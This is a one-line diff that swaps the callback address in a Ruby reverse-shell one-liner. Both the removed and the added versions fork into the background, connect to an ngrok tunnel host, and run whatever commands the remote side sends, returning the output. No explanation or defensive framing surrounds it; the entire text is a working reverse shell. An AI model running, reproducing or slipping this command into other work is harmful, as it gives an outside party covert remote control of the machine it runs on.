@@ -1,1 +1,1 @@
-ruby -rsocket -e'exit if fork;c=TCPSocket.new("0.tcp.ngrok.io","12085");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}'
+ruby -rsocket -e'exit if fork;c=TCPSocket.new("2.tcp.ngrok.io","16892");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}'
